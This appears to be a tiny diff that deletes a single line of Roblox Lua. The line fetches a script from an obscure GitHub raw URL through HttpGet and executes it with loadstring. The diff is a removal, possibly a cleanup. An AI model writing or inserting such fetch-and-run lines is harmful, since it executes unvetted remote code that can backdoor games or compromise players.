@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ajdfjdfdajsnfdfurhu13y7413643yad/felfelfeads12321dasdsa/main/12312632akrgjfajfefes", true))()
